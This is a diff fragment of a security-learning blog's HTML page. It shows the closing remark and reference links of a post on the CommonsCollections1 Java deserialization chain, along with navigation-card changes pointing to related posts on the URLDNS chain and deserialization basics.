+<p>CommonsCollections1就暂时学到这里了，其实还有有一些不太明白的地方，就先暂时放在这里，说不定哪天就豁然开朗了，下篇再会。</p>
+<h3><span id="参考链接">参考链接</span></h3><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44874132/article/details/113367441">https://blog.csdn.net/weixin_44874132/article/details/113367441</a></p>
 
                 
             </div>
@@ -471,7 +475,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://majorttt.github.io/2024/03/22/urldns%E9%93%BE%E5%88%A9%E7%94%A8/">https://majorttt.github.io/2024/03/22/urldns%E9%93%BE%E5%88%A9%E7%94%A8/</a>
+                    <a href="https://majorttt.github.io/2024/03/26/CommonsCollections1%E9%93%BE%E6%89%8B%E5%86%99%E5%88%A9%E7%94%A8/">https://majorttt.github.io/2024/03/26/CommonsCollections1%E9%93%BE%E6%89%8B%E5%86%99%E5%88%A9%E7%94%A8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -560,9 +564,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2024/03/26/CommonsCollections1%E9%93%BE%E6%89%8B%E5%86%99%E5%88%A9%E7%94%A8/">
                     <div class="card-image">
@@ -580,9 +585,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-03-26
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-03-26
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -595,6 +600,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -617,13 +623,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2024/03/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%B0%84%E5%9F%BA%E7%A1%80/">
+                <a href="/2024/03/22/urldns%E9%93%BE%E5%88%A9%E7%94%A8/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="Java反序列化基础&amp;反射基础">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="urldns链利用">
                         
-                        <span class="card-title">Java反序列化基础&amp;反射基础</span>
+                        <span class="card-title">urldns链利用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -634,7 +640,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-03-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-03-22
                             </span>
                         <span class="publish-author">
                             
